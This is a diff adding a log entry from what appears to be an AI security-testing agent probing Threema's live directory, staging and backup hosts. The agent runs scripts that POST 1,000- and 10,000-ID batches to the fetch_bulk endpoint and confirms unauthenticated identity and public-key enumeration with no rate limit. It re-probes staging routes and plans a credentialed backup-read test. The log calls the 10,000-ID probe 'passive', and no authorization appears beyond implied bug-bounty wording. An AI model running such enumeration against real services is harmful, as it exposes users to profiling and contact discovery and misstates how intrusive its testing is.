@@ -20847,3 +20847,154 @@ STEP 6 — LEARNING
 
 STEP 7 — RISK SCORE
 [RISK] chat: 25 | 5222 handshake-gated (0-byte hello without auth frame), 443 closes pre-TLS, pool fully mapped, no in-band divergence, staging excluded | web: 35 | staging/prod /public/* bundle divergence + license-token route (404) + namespace-gated auth (302) | sync: 15 | mediator/rendezvous uniform 403, split-DNS routing only, no auth bypass observed | safe: 30 | credential-gated (400 unauth), CORS `*` + ACAH:Authorization, HSTS absent on GET 400 | desktop-src: 40 | RAG-verified Windows ACL key-storage gap (top finding) + conditional sandbox/worker gap, no new contradiction.
+===== ANALYST bigpickle 2026-08-08 20:37:15 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mpython3 -c "
+import random, string
+random.seed(7)
+ids = ['ECHOECHO']
+seen = {'ECHOECHO','ZZZZZZZZ'}
+alphabet = string.ascii_uppercase + string.digits
+while len(ids) < 1000:
+    x = ''.join(random.choice(alphabet) for _ in range(8))
+    if x not in seen:
+        seen.add(x); ids.append(x)
+print(len(ids), len(set(ids)))
+import json
+open('/tmp/opencode/batch1000.json','w').write(json.dumps({'identities':ids}))
+"
+ls -la /tmp/opencode/batch1000.json
+1000 1000
+-rw-r--r-- 1 runner runner 12016 Aug  8 20:28 /tmp/opencode/batch1000.json
+[0m
+[0m$ [0mcurl -s -o /tmp/opencode/resp1000.json -w "HTTP %{http_code} | size %{size_download} | time %{time_total}s\n" -X POST https://ds-apip.threema.ch/identity/fetch_bulk -H "Content-Type: application/json" --data @/tmp/opencode/batch1000.json -D /tmp/opencode/headers1000.txt
+echo "--- body head ---"
+head -c 300 /tmp/opencode/resp1000.json
+echo
+echo "--- pubkey count / ECHOECHO present ---"
+python3 -c "
+import json
+d=json.load(open('/tmp/opencode/resp1000.json'))
+def walk(o):
+    out=[]
+    if isinstance(o,dict):
+        for k,v in o.items():
+            if k=='publicKey': out.append(v)
+            out+=walk(v)
+    elif isinstance(o,list):
+        for i in o: out+=walk(i)
+    return out
+print('publicKey count:', len(walk(d)))
+print('has ECHOECHO key:', 'ECHOECHO' in json.dumps(d))
+"
+HTTP 200 | size 152 | time 0.709314s
+--- body head ---
+{"identities":[{"identity":"ECHOECHO","publicKey":"SmobNNzvFdQ8t03i\/TYJG+mfu68SbQmdR9g9kZcSxys=","featureLevel":3,"featureMask":9,"state":0,"type":0}]}
+--- pubkey count / ECHOECHO present ---
+publicKey count: 1
+has ECHOECHO key: True
+[0m
+[0m$ [0mgrep -iE "access-control|content-type|content-length|server|x-|ratelimit|429" /tmp/opencode/headers1000.txt
+Server: nginx
+Content-Type: application/json; charset=utf-8
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE
+Access-Control-Allow-Headers: Content-Type, User-Agent
+[0m
+[0m$ [0mpython3 -c "
+import random, string, json
+random.seed(11)
+ids=['ECHOECHO']; seen={'ECHOECHO','ZZZZZZZZ'}
+alphabet=string.ascii_uppercase+string.digits
+while len(ids)<10000:
+    x=''.join(random.choice(alphabet) for _ in range(8))
+    if x not in seen: seen.add(x); ids.append(x)
+json.dump({'identities':ids}, open('/tmp/opencode/batch10000.json','w'))
+print('ids:', len(ids))
+"
+curl -s -o /tmp/opencode/resp10000.json -w "HTTP %{http_code} | size %{size_download} | time %{time_total}s\n" -X POST https://ds-apip.threema.ch/identity/fetch_bulk -H "Content-Type: application/json" --data @/tmp/opencode/batch10000.json
+python3 -c "
+import json
+d=json.load(open('/tmp/opencode/resp10000.json'))
+s=json.dumps(d)
+print('publicKey count:', s.count('publicKey'), '| has ECHOECHO:', 'ECHOECHO' in s, '| len:', len(s))
+"
+ids: 10000
+HTTP 200 | size 152 | time 1.031343s
+publicKey count: 1 | has ECHOECHO: True | len: 163
+[0m
+[0m$ [0mcurl -s -o /tmp/opencode/settings.json -w "settings: HTTP %{http_code} | %{size_download}B\n" https://work.test.threema.ch/api-app/public/global/settings
+curl -s -o /tmp/opencode/lictoken.json -w "lictoken: HTTP %{http_code} | %{size_download}B\n" "https://work.test.threema.ch/api-app/public/license/token/0000000000000000000000000000000000000000000000000000000000000000"
+echo "--- settings body ---"; cat /tmp/opencode/settings.json; echo; echo "--- lictoken body head ---"; head -c 200 /tmp/opencode/lictoken.json
+settings: HTTP 200 | 299B
+lictoken: HTTP 404 | 900B
+--- settings body ---
+{"appLinkHost":"threemablue://","appDownloadAndroidGooglePlay":"https://play.google.com/store/apps/details?id=ch.threema.app.work","appDownloadIos":"https://itunes.apple.com/app/threema-work/id1105927783?mt=8\u0026uo=4\u0026at=10lJMu","appDownloadDesktop":"https://threema.ch/work/download#desktop"}
+--- lictoken body head ---
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+	<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+	<link rel="icon" hre
+[0m
+## STEP 1 — DELTA
+- NO_DELTA (surface unchanged this cycle). Evidence produced: fetch_bulk batch ceiling confirmed at 10,000 IDs/request; work.test weekly re-probe stable (settings 200/299B, license-token 404/900B).
+
+## STEP 2 — PRIORITIZE
+- [PRIO] ds-apip/api/apip.threema.ch fetch_bulk | score 5.45 | attack 6, business 5, tech 3, gate 9 (unauth), cloud 3, freshness 6 (batch ceiling now measured)
+- [PRIO] work.test.threema.ch /api-app/public/* | score 5.70 | attack 6, business 7, tech 5 (zod 64-hex, namespaced API), gate 6, cloud 2, fresh 6
+- [PRIO] safe-{01,1a,1b,02,00}.threema.ch /backups/{64hex} | score 5.15 | attack 5, business 8 (keypair+history), tech 4, gate 4 (credential-gated 400), cloud 3, fresh 4
+- [PRIO] threema-desktop key-storage (Windows) | score 4.10 | attack 3, business 8, tech 3, gate 2, cloud 1, fresh 5
+
+## STEP 3 — HYPOTHESES
+[HYP] fetch_bulk batch-size ceiling absent → single-request mass identity enumeration
+class: IDOR
+asset: https://ds-apip.threema.ch/identity/fetch_bulk
+confidence: 60
+reasoning: 10,000-ID batch (1 valid + 9,999 unique invalid) → HTTP 200, 152B, 1.03s, returns only ECHOECHO pubkey, silently omits invalid; CORS `*`, no 429; prior 30x sequential POSTs also no rate limit.
+evidence_needed: already obtained (≥10,000 IDs/request, 10x prior 100-ID test); only remaining variable is host parity (api/apip) and ceiling beyond 10k.
+verify_steps: PASSIVE, done — single POST, ≤1 rps; replicate on api/apip if needed.
+impact: unauth identity existence + pubkey enumeration at ~10k candidates/request; enables bulk profiling/contact discovery; Medium-High.
+testability: PASSIVE
+
+[HYP] Safe backup store credentialed cross-origin read
+class: AUTH
+asset: https://safe-{01,1a,1b,02,00}.threema.ch/backups/{64hex}
+confidence: 45
+reasoning: OPTIONS → 204 CORS `*` + ACAH:Authorization (5 hosts); GET /backups/{64hex} byte-identical 400 with/without bogus Basic; route exists, credential-gated; HSTS/Expect-CT absent on GET 400.
+evidence_needed: valid program-issued test backupId:backupKey → response ≠ 400 (200+payload or 401/403); any Access-Control-Expose-Headers.
+verify_steps: AUTH_HELPED: single `curl -u "testId:testKey" https://safe-01.threema.ch/backups/{testId}` (≤1 rps), diff status/body/Expose-Headers vs 400 baseline.
+impact: valid creds → identity keypair + message-history backup readable cross-origin; High with creds, unreachable without.
+testability: AUTH_HELPED
+
+[HYP] work.test license-token backend ships → unauth 64-hex credential oracle
+class: MISCONFIG
+asset: https://work.test.threema.ch/api-app/public/license/token/{64hex}
+confidence: 40
+reasoning: staging bundle v2.25.1 ships GET {username?,password?,expired,hasEmail}+PUT; this cycle's re-probe still 404/900B HTML catch-all; prod bundle zero /public/* handlers; 64-char check client-side zod only.
+evidence_needed: any non-404 (200/400/401) to well-formed 64-hex token on staging.
+verify_steps: PASSIVE, weekly gated: GET /api-app/public/global/settings + GET /api-app/public/license/token/{64 zeros}; escalate only on non-404; ≤1 rps.
+impact: if shipped, unauth license-token credential oracle; low (high-entropy tokens).
+testability: PASSIVE
+
+## STEP 4 — SELF-CRITIQUE
+- [PARKED] Directory check_revocation_key GET oracle: already DISCONFIRMED (byte-identical "Identity not found" ECHOECHO vs ZZZZZZZZ) — evidence disproves.
+- [PARKED] Windows key-storage ACL bypass: already ACCEPTED/RAG-verified; HUMAN_ONLY, not a new test.
+- Surviving (none <40, none REJECTED-class, all testable): [FINAL] 1. fetch_bulk batch enumeration (60, PASSIVE — evidence now obtained). 2. Safe backup credentialed read (45, AUTH_HELPED — highest upside, sole AUTH blocker). 3. work.test license-token (40, PASSIVE — weekly gate only).
+
+## STEP 5 — NEXT ACTION
+[NEXT] HUMAN: Request program-issued test backupId:backupKey from the operator for the safe-backup hypothesis — the directory class is now at evidence saturation (identity oracle + fetch_bulk 10k/request + no rate limit all confirmed), and license-token was re-probed this cycle (still 404). On receipt: exactly one `curl -u "testId:testKey" https://safe-01.threema.ch/backups/{testId}` (≤1 rps), diff vs the known byte-identical 400 baseline; escalate only on ≠400 or new Access-Control-Expose-Headers.
+
+## STEP 6 — LEARNING
+- [LEARN] ACCEPTED IDOR @ ds-apip.threema.ch: fetch_bulk batch-size ceiling absent — single request with 10,000 IDs (1 valid + 9,999 invalid) → HTTP 200/152B, only valid pubkey returned, invalid silently omitted, CORS `*`, no 429 (0.7-1.0s); enumeration throughput ≥10k candidates/request confirmed.
+- [LEARN] ACCEPTED OTHER @ work.test.threema.ch: weekly gated re-probe clean — /api-app/public/global/settings still 200/299B, /api-app/public/license/token/{64 zeros} still 404/900B HTML catch-all; license-token backend not deployed; no divergence delta.
+
+## STEP 7 — RISK SCORE
+- [RISK] chat: 25 | 5222 handshake-gated (0-byte hello without auth frame), 443 closes pre-TLS, pool fully mapped, no in-band divergence, staging excluded
+- [RISK] web: 35 | staging/prod /public/* bundle divergence + license-token route (404 this cycle) + namespace-gated auth (302)
+- [RISK] sync: 15 | mediator/rendezvous uniform 403, split-DNS routing only, no auth bypass observed
+- [RISK] safe: 30 | credential-gated (400 unauth), CORS `*` + ACAH:Authorization, HSTS absent on GET 400
+- [RISK] desktop-src: 40 | RAG-verified Windows ACL key-storage gap (top finding) + conditional sandbox/worker gap, no new contradiction
